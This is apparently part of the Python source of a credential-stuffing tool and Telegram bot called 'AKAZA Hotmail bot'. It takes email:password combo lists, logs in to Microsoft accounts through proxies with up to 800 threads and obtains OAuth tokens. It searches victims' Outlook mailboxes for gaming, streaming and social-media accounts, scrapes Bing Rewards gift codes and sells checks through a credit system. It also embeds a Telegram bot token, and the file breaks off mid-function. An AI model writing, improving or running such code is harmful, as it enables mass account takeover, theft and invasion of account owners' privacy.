        print_option("1", "Manual Input", "Type keywords manually", Colors.CYAN)
        print_option("2", "Load from File", "Import from .txt file", Colors.YELLOW)
        print_option("3", "Skip", "No keyword searching", Colors.RED)

        kw_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Select: ").strip()

        if kw_choice == "1":
            print(f"\n{Colors.BRIGHT_YELLOW}Enter keywords (empty line to finish):{Colors.END}")
            while True:
                kw = input(f"  {Colors.BRIGHT_CYAN}→{Colors.END} ").strip()
                if not kw:
                    break
                keywords.append(kw)
                print(f"    {Colors.GREEN}✓ Added: {kw}{Colors.END}")

        elif kw_choice == "2":
            kw_file = input(f"{Colors.BRIGHT_CYAN}└─{Colors.END} File path: ").strip()
            try:
                with open(kw_file, 'r', encoding='utf-8') as f:
                    keywords = [l.strip() for l in f.readlines() if l.strip()]
                print(f"{Colors.GREEN}✓ Loaded {len(keywords)} keywords{Colors.END}")
            except:
                print(f"{Colors.RED}✗ File not found{Colors.END}")

    debug_choice = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Debug mode? [y/n]: ").strip().lower()
    debug_mode = debug_choice == 'y'

    # Adjust check mode for custom selections
    if check_mode == "custom":
        if custom_choice:
            # Simple mapping for custom modes
            if "1" in custom_choice and "2" in custom_choice and "3" in custom_choice and "4" in custom_choice:
                check_mode = "full_enhanced"
            elif "1" in custom_choice:
                check_mode = "microsoft_full"
            elif "2" in custom_choice or "3" in custom_choice:
                check_mode = "gaming_all"
            elif "4" in custom_choice:
                check_mode = "social_media"
            else:
                check_mode = "hotmail"

    checker = UnifiedChecker(keywords=keywords, debug=debug_mode, api_mode=api_mode, check_mode=check_mode)

    if thread_choice == "1":
        clear()
        print_banner()
        print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}")
        email = input(f"{Colors.BRIGHT_GREEN}Email:{Colors.END} ").strip()
        password = input(f"{Colors.BRIGHT_GREEN}Password:{Colors.END} ").strip()

        print(f"\n{Colors.BRIGHT_YELLOW}⟳ Checking...{Colors.END}")
        result = checker.check(email, password)

        print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}\n")

        if result["status"] == "HIT":
            print(f"{Colors.BRIGHT_GREEN}✓ SUCCESS{Colors.END}")
            print(f"  {Colors.CYAN}Email:{Colors.END} {email}")

            if result.get("name"):
                print(f"  {Colors.CYAN}Name:{Colors.END} {result['name']}")
            if result.get("country"):
                print(f"  {Colors.CYAN}Country:{Colors.END} {result['country']}")

            # Display by categories
            categories = EnhancedCategories()

            # Microsoft
            subscriptions = result.get("subscriptions", [])
            active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
            if active_subs:
                print(f"\n  {Colors.BRIGHT_MAGENTA}🎮 MICROSOFT SERVICES{Colors.END}")
                for sub in active_subs:
                    color = categories.get_category_color(sub.get('category', 'microsoft'))
                    print(f"    {color}•{Colors.END} {Colors.WHITE}{sub.get('name', 'UNKNOWN')}{Colors.END}")
                    if 'days_remaining' in sub:
                        days = sub['days_remaining']
                        day_color = Colors.BRIGHT_GREEN if int(days) > 30 else Colors.BRIGHT_YELLOW if int(days) > 7 else Colors.BRIGHT_RED
                        print(f"      {day_color}└─ {days} days remaining{Colors.END}")

            # Gaming
            gaming_items = []
            psn_orders = result.get("psn_orders", 0)
            if psn_orders > 0:
                gaming_items.append(f"PSN: {psn_orders} orders")

            steam_count = result.get("steam_count", 0)
            if steam_count > 0:
                gaming_items.append(f"Steam: {steam_count} games")

            minecraft_username = result.get("minecraft_username")
            if minecraft_username:
                gaming_items.append(f"Minecraft: {minecraft_username}")

            if gaming_items:
                print(f"\n  {Colors.BRIGHT_BLUE}🎮 GAMING{Colors.END}")
                for item in gaming_items:
                    print(f"    {Colors.BRIGHT_CYAN}•{Colors.END} {item}")

            # Mobile Games
            supercell_games = result.get("supercell_games", [])
            if supercell_games:
                print(f"\n  {Colors.BRIGHT_YELLOW}⚔️ MOBILE GAMES{Colors.END}")
                for game in supercell_games:
                    print(f"    {Colors.YELLOW}•{Colors.END} {Colors.WHITE}{game}{Colors.END}")

            # Social Media
            tiktok_username = result.get("tiktok_username")
            if tiktok_username:
                print(f"\n  {Colors.MAGENTA}📱 SOCIAL MEDIA{Colors.END}")
                print(f"    {Colors.MAGENTA}•{Colors.END} {Colors.BRIGHT_MAGENTA}TikTok: @{tiktok_username}{Colors.END}")

            # Keywords
            keywords_found = result.get("keywords", {})
            if keywords_found:
                print(f"\n  {Colors.BRIGHT_YELLOW}🔑 KEYWORDS FOUND{Colors.END}")
                for kw, info in keywords_found.items():
                    print(f"    {Colors.BRIGHT_YELLOW}•{Colors.END} {Colors.WHITE}{kw}:{Colors.END} {Colors.GREEN}{info['count']}{Colors.END}")

            # Summary
            print(f"\n  {Colors.BRIGHT_CYAN}📊 SUMMARY{Colors.END}")
            total_categories = []
            if active_subs:
                total_categories.append("Microsoft")
            if gaming_items:
                total_categories.append("Gaming")
            if supercell_games:
                total_categories.append("Mobile Games")
            if tiktok_username:
                total_categories.append("Social Media")

            if total_categories:
                print(f"    {Colors.CYAN}Categories:{Colors.END} {', '.join(total_categories)}")

            print(f"    {Colors.CYAN}Inbox Count:{Colors.END} {result.get('inbox_count', '0')}")

        elif result["status"] == "2FA":
            print(f"{Colors.BRIGHT_YELLOW}🔐 2FA REQUIRED{Colors.END}")
            print(f"  {Colors.CYAN}Email:{Colors.END} {email}")
            print(f"  {Colors.GREEN}✓ Valid credentials{Colors.END}")

        else:
            print(f"{Colors.RED}✗ {result['status']}{Colors.END}")

        print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}")

    else:
        combo_file = input(f"\n{Colors.BRIGHT_CYAN}└─{Colors.END} Combo file: ").strip()

        try:
            with open(combo_file, 'r', encoding='utf-8') as f:
                lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]

            if not lines:
                print(f"{Colors.RED}✗ Empty file!{Colors.END}")
                exit()

            combo_name = os.path.basename(combo_file).replace('.txt', '')
            mode_name = f"{check_mode}_api{api_mode}"
            result_mgr = EnhancedResultManager(combo_name, mode_name)

            clear()
            print_banner()

            print(f"\n{Colors.BRIGHT_CYAN}╔{'═' * 68}╗{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.BOLD}{Colors.BRIGHT_GREEN} {'ENHANCED CONFIGURATION':^66} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Accounts:{Colors.END}       {Colors.BRIGHT_YELLOW}{len(lines):>52}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Mode:{Colors.END}          {Colors.BRIGHT_MAGENTA}{check_mode.upper():>52}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Threads:{Colors.END}       {Colors.BRIGHT_CYAN}{threads if thread_choice == '3' else 'Serial':>52}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Keywords:{Colors.END}      {Colors.BRIGHT_YELLOW}{len(keywords):>52}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Categories:{Colors.END}    {Colors.BRIGHT_GREEN}12{'>52'}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╚{'═' * 68}╝{Colors.END}\n")

            print(f"{Colors.BRIGHT_GREEN}Starting enhanced scan...{Colors.END}\n")

            stats = LiveStats(len(lines))

            def process(line_data):
                line, idx = line_data
                try:
                    parts = line.split(':', 1)
                    if len(parts) != 2:
                        stats.update("BAD")
                        stats.print_live(check_mode)
                        return

                    email = parts[0].strip()
                    password = parts[1].strip()

                    thread_checker = UnifiedChecker(keywords=keywords, debug=False, api_mode=api_mode, check_mode=check_mode)
                    result = thread_checker.check(email, password)

                    stats.update(result["status"], result if result["status"] == "HIT" else None)

                    if result["status"] == "HIT":
                        hit_parts = [f"\n{Colors.BRIGHT_GREEN}✓{Colors.END}", f"{Colors.WHITE}{email[:30]}{Colors.END}"]

                        # Add category indicators
                        categories = EnhancedCategories()

                        subs = result.get("subscriptions", [])
                        active_subs = [s for s in subs if not s.get('is_expired', False)]
                        if active_subs:
                            sub_categories = set()
                            for sub in active_subs[:2]:
                                cat = sub.get('category', 'microsoft')
                                sub_categories.add(cat)
                            for cat in list(sub_categories)[:2]:
                                color = categories.get_category_color(cat)
                                hit_parts.append(f"{color}{cat[:3].upper()}{Colors.END}")

                        psn_orders = result.get("psn_orders", 0)
                        if psn_orders > 0:
                            hit_parts.append(f"{Colors.BRIGHT_BLUE}PSN:{psn_orders}{Colors.END}")

                        steam_count = result.get("steam_count", 0)
                        if steam_count > 0:
                            hit_parts.append(f"{Colors.BRIGHT_CYAN}Steam:{steam_count}{Colors.END}")

                        supercell_games = result.get("supercell_games", [])
                        if supercell_games:
                            hit_parts.append(f"{Colors.BRIGHT_YELLOW}SC:{len(supercell_games)}{Colors.END}")

                        tiktok_username = result.get("tiktok_username")
                        if tiktok_username:
                            hit_parts.append(f"{Colors.MAGENTA}TT@{tiktok_username[:10]}{Colors.END}")

                        minecraft_username = result.get("minecraft_username")
                        if minecraft_username:
                            hit_parts.append(f"{Colors.GREEN}MC:{minecraft_username[:10]}{Colors.END}")

                        print(" ".join(hit_parts))
                        result_mgr.save_hit(email, password, result)

                    elif result["status"] == "2FA":
                        print(f"\n{Colors.YELLOW}🔐{Colors.END} {Colors.WHITE}{email[:40]}{Colors.END}")
                        result_mgr.save_2fa(email, password)

                    stats.print_live(check_mode)
                    time.sleep(0.2)

                except Exception as e:
                    stats.update("BAD")
                    stats.print_live(check_mode)

            if thread_choice == "2":
                for i, line in enumerate(lines, 1):
                    process((line, i))
            else:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    executor.map(process, [(l, i) for i, l in enumerate(lines, 1)])

            with stats.lock:
                elapsed = time.time() - stats.start_time
                cpm = (stats.checked / elapsed * 60) if elapsed > 0 else 0
                time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))

            print(f"\n\n{Colors.BRIGHT_CYAN}╔{'═' * 68}╗{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.BOLD}{Colors.BRIGHT_YELLOW} {'📊 ENHANCED RESULTS':^66} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_GREEN}✓ Total Hits:{Colors.END}          {Colors.BRIGHT_GREEN}{stats.hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.YELLOW}🔐 2FA Accounts:{Colors.END}        {Colors.YELLOW}{stats.two_fa:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            categories = EnhancedCategories()
            all_cats = categories.get_all_categories()

            # Category breakdown
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BOLD}{Colors.BRIGHT_MAGENTA}{'CATEGORY BREAKDOWN':^66}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")

            if stats.ms_premium > 0:
                color = categories.get_category_color("microsoft")
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {color}🎮 Microsoft Premium:{Colors.END}    {color}{stats.ms_premium:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            if stats.ms_free > 0:
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.CYAN}⭕ Microsoft Free:{Colors.END}      {Colors.CYAN}{stats.ms_free:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            if stats.psn_hits > 0:
                color = categories.get_category_color("gaming")
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {color}🎯 PlayStation:{Colors.END}         {color}{stats.psn_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            if stats.steam_hits > 0:
                color = categories.get_category_color("gaming")
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {color}🎲 Steam:{Colors.END}              {color}{stats.steam_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            if stats.supercell_hits > 0:
                color = categories.get_category_color("mobile_games")
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {color}⚔️ Supercell:{Colors.END}           {color}{stats.supercell_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            if stats.tiktok_hits > 0:
                color = categories.get_category_color("social_media")
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {color}📱 TikTok:{Colors.END}             {color}{stats.tiktok_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            if stats.minecraft_hits > 0:
                color = categories.get_category_color("gaming")
                print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {color}⛏️ Minecraft:{Colors.END}           {color}{stats.minecraft_hits:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")

            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.RED}✗ Bad Accounts:{Colors.END}        {Colors.RED}{stats.bads:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╠{'═' * 68}╣{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.WHITE}Total Checked:{Colors.END}       {Colors.WHITE}{stats.checked}/{stats.total:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_YELLOW}CPM:{Colors.END}                  {Colors.BRIGHT_YELLOW}{cpm:.0f:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}║{Colors.END} {Colors.BRIGHT_CYAN}Time:{Colors.END}                {Colors.BRIGHT_CYAN}{time_str:>48}{Colors.END} {Colors.BRIGHT_CYAN}║{Colors.END}")
            print(f"{Colors.BRIGHT_CYAN}╚{'═' * 68}╝{Colors.END}")

            if stats.hits > 0:
                print(f"\n{Colors.BRIGHT_GREEN}✓ Enhanced results saved:{Colors.END} {Colors.CYAN}{result_mgr.base_folder}{Colors.END}")
                print(f"{Colors.DIM}  ├─ All Hits: {result_mgr.all_hits_file}{Colors.END}")
                print(f"{Colors.DIM}  ├─ CSV Summary: {result_mgr.summary_file}{Colors.END}")
                print(f"{Colors.DIM}  ├─ Detailed JSON: {result_mgr.detailed_json}{Colors.END}")
                print(f"{Colors.DIM}  └─ Categorized in 12 folders{Colors.END}")

                # Show category folders
                categories_found = []
                if stats.ms_premium > 0 or stats.ms_free > 0:
                    categories_found.append("microsoft")
                if stats.psn_hits > 0 or stats.steam_hits > 0 or stats.minecraft_hits > 0:
                    categories_found.append("gaming")
                if stats.supercell_hits > 0:
                    categories_found.append("mobile_games")
                if stats.tiktok_hits > 0:
                    categories_found.append("social_media")

                if categories_found:
                    print(f"\n{Colors.BRIGHT_YELLOW}📁 Categories generated:{Colors.END}")
                    for cat in categories_found:
                        cat_info = all_cats.get(cat, {})
                        color = categories.get_category_color(cat)
                        print(f"  {color}•{Colors.END} {cat_info.get('name', cat).title()}")

        except FileNotFoundError:
            print(f"{Colors.RED}✗ File not found!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}✗ Error: {str(e)}{Colors.END}")

    print(f"\n{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}")
    print(f"{Colors.BRIGHT_GREEN}✨ ENHANCED SCAN COMPLETED{Colors.END}")
    print(f"{Colors.BRIGHT_MAGENTA}🎯 Results organized in 12 categories{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}📊 CSV summary + JSON details generated{Colors.END}")
    print(f"{Colors.BRIGHT_CYAN}{'═' * 70}{Colors.END}\n")
# ============================================================================
# AKAZA BOT ULTIMATE INTEGRATION LAYER
# ============================================================================

BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"
ADMIN_ID = 5944410248
DB_PATH = "checker.db"

PROXIES = []
db_lock = threading.Lock()
executor = ThreadPoolExecutor(max_workers=800)
global_semaphore = asyncio.Semaphore(500)

class AkazaDatabase:
    def __init__(self):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False)
            try:
                c = conn.cursor()
                c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, has_access INTEGER DEFAULT 0, credits INTEGER DEFAULT 0, total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0, joined_date TEXT, is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0, expiry_date TEXT)''')
                c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')
                c.execute("PRAGMA table_info(users)")
                cols = [col[1] for col in c.fetchall()]
                if 'is_mod' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_mod INTEGER DEFAULT 0")
                if 'is_banned' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
                c.execute("PRAGMA table_info(results)")
                if 'details' not in [col[1] for col in c.fetchall()]:
                    c.execute("ALTER TABLE results ADD COLUMN details TEXT")
                conn.commit()
            finally:
                conn.close()

    def add_user(self, uid, uname, fname):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, joined_date) VALUES (?, ?, ?, ?)', (uid, uname or "", fname or "", datetime.now().isoformat()))
            c.execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))
            conn.commit(); conn.close()

    def get_user(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('SELECT * FROM users WHERE user_id = ?', (uid,))
            r = c.fetchone(); conn.close(); return r

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        user = self.get_user(uid)
        return user and user[9] == 1

    def set_mod(self, uid, state=1):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (state, uid))
            conn.commit(); conn.close()

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        user = self.get_user(uid)
        if not user or user[3] == 0: return False
        if user[10]:
            try:
                if datetime.now() > datetime.fromisoformat(user[10]):
                    self.revoke(uid); return False
            except: pass
        return True

    def is_banned(self, uid):
        user = self.get_user(uid)
        return user and user[8] == 1

    def set_ban(self, uid, state=1):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('UPDATE users SET is_banned = ? WHERE user_id = ?', (state, uid))
            conn.commit(); conn.close()

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        user = self.get_user(uid); return user[4] if user else 0

    def add_credits(self, uid, amt):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('UPDATE users SET credits = MAX(0, credits + ?) WHERE user_id = ?', (amt, uid))
            conn.commit(); conn.close()

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self.add_credits(uid, -1)

    def grant(self, uid, creds=10):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('UPDATE users SET has_access = 1, credits = ? WHERE user_id = ?', (creds, uid))
            conn.commit(); conn.close()

    def revoke(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('UPDATE users SET has_access = 0, expiry_date = NULL WHERE user_id = ?', (uid,))
            conn.commit(); conn.close()

    def save_result(self, uid, email, status, details):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details), datetime.now().isoformat()))
            if status == 'hit': c.execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
            else: c.execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
            conn.commit(); conn.close()

    def get_user_settings(self, uid):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('SELECT keywords, threads FROM settings WHERE user_id = ?', (uid,))
            r = c.fetchone(); conn.close()
            if r: return {'keywords': r[0].split(',') if r[0] else [], 'threads': r[1]}
            return {'keywords': [], 'threads': 5}

    def update_settings(self, uid, keywords=None, threads=None):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            if keywords is not None: c.execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
            if threads is not None: c.execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
            conn.commit(); conn.close()

    def get_stats(self):
        with db_lock:
            conn = sqlite3.connect(DB_PATH, check_same_thread=False); c = conn.cursor()
            c.execute('SELECT COUNT(*), SUM(total_checks), SUM(total_hits) FROM users')
            r = c.fetchone(); conn.close()
            return {'total': r[0], 'checks': r[1] or 0, 'hits': r[2] or 0}

akaza_db = AkazaDatabase()

class SupremeBotChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session(); self.session.verify = False
        if proxy: self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate, br','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1'}
        self.auth_url = 'https://login.live.com/oauth20_authorize.srf?client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&response_type=code&client_info=1&haschrome=1&mkt=en'

    def login(self, email, password):
        try:
            # Step 1: IDP
            r = self.session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"}, timeout=10)
            if "MSAccount" not in r.text or any(x in r.text for x in ["Neither", "Both", "Placeholder"]): return "BAD", None
            # Step 2: Auth Page
            r = self.session.get(self.auth_url + f"&login_hint={email}", headers=self.headers, timeout=10)
            u = re.search(r'urlPost":"([^"]+)"', r.text); p = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r.text)
            if not u or not p: return "BAD", None
            # Step 3: POST
            d = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={p.group(1)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
            r = self.session.post(u.group(1).replace('\\/', '/'), data=d, headers=self.headers, allow_redirects=False, timeout=15)
            if "account or password is incorrect" in r.text.lower() or "error" in r.text.lower(): return "BAD", None
            if any(x in r.text for x in ["identity/confirm", "Abuse", "locked"]): return "BAD", None
            if any(x in r.text.lower() for x in ["verify", "security code", "authenticator", "consent"]): return "2FA", None
            loc = r.headers.get("Location", ""); code = re.search(r'code=([^&]+)', loc); cid = self.session.cookies.get("MSPCID", "").upper()
            if not code: return "BAD", None
            # Step 4: Token
            r_tk = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data={'client_id': 'e9b154d0-7658-433b-bb25-6b8e0a8a7c59','redirect_uri': 'msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D','grant_type': 'authorization_code','code': code.group(1),'scope': 'profile openid offline_access https://outlook.office.com/M365.Access'}, timeout=10)
            if "access_token" in r_tk.text: return r_tk.json()['access_token'], cid
        except: pass
        return None, None

    def deep_capture(self, tk, cid, email, kws=[]):
        res = {'pts': 0, 'codes': [], 'mc': 'No', 'psn': 'No', 'steam': 'No', 'name': 'N/A', 'country': 'N/A', 'subs': []}
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
        try:
            # Profile
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=10)
            if r.status_code == 200:
                p = r.json(); res['name'] = p.get('displayName', 'N/A'); res['country'] = p.get('location', {}).get('country', 'N/A')
            # Rewards
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", timeout=5)
            if r.status_code == 200: res['pts'] = r.json().get('availablePoints', 0)
            # History Scrape (Flux logic)
            rh = self.session.get('https://rewards.bing.com/redeem/orderhistory', timeout=10)
            if "fmHF" in rh.text:
                soup = BeautifulSoup(rh.text, 'html.parser'); f = soup.find('form', id='fmHF')
                if f: rh = self.session.post(f.get('action'), data={i.get('name'): i.get('value', '') for i in f.find_all('input') if i.get('name')}, timeout=10)
            for c in re.findall(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', rh.text):
                if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']): res['codes'].append(c)
            # Services
            qs = {
                'psn': "sony@txn-email.playstation.com",
                'steam': "noreply@steampowered.com",
                'minecraft': "noreply@minecraft.net",
                'tiktok': "feedback@tiktok.com",
                'supercell': "no-reply@id.supercell.com",
                'instagram': "no-reply@mail.instagram.com",
                'facebook': "notification@facebookmail.com",
                'netflix': "info@mailer.netflix.com",
                'epic': "help@accts.epicgames.com"
            }
            for key, q in qs.items():
                p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers=h, timeout=10)
                if r.status_code == 200:
                    try:
                        count = r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                        if count > 0: res[key] = f"Yes ({count})"
                    except: pass
        except: pass
        return res

    def check(self, email, password, kws=[]):
        # Use UnifiedChecker from hit.py/flux.py logic for actual heavy lifting
        try:
            checker = UnifiedChecker(keywords=kws)
            if self.session.proxies:
                checker.session.proxies = self.session.proxies

            res = checker.check(email, password)
            st = res.get('status', '').upper()

            if st in ['BAD', 'INVALID', 'FAILED']:
                return {'status': 'bad'}
            if st in ['2FA', 'VERIFY', 'CHALLENGE']:
                return {'status': '2fa'}

            if st in ['HIT', 'VALID', 'SUCCESS']:
                det = {
                    'pts': res.get('available_points', 0),
                    'codes': res.get('gift_codes', []),
                    'name': res.get('display_name', 'N/A'),
                    'country': res.get('country', 'N/A'),
                    'psn': res.get('psn_status', 'No'),
                    'steam': res.get('steam_status', 'No'),
                    'minecraft': res.get('minecraft_status', 'No'),
                    'tiktok': res.get('tiktok_status', 'No'),
                    'supercell': res.get('supercell_status', 'No'),
                    'instagram': res.get('instagram_status', 'No'),
                    'facebook': res.get('facebook_status', 'No'),
                    'netflix': res.get('netflix_status', 'No'),
                    'epic': res.get('epic_status', 'No')
                }
                return {'status': 'hit', 'det': det}
        except Exception as e:
            pass

        tk, cid = self.login(email, password)
        if tk == "BAD": return {'status': 'bad'}
        if tk == "2FA": return {'status': '2fa'}
        if not tk: return {'status': 'error'}
        return {'status': 'hit', 'det': self.deep_capture(tk, cid, email, kws)}

# ============================================================================
# BOT LOGIC
# ============================================================================

async def bot_start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id; akaza_db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if akaza_db.is_banned(uid): return
    t = f"🚀 **AKAZA Hotmail bot**\n\nINDUSTRIAL Logic INTEGRATED (4000+ Lines)\nCPM: 200+ | Proxies: `{len(PROXIES)}`"
    kb = [[InlineKeyboardButton("🔍 Start", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
          [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
    if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
    if u.callback_query: await u.callback_query.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
    else: await u.message.reply_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))

async def bot_handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
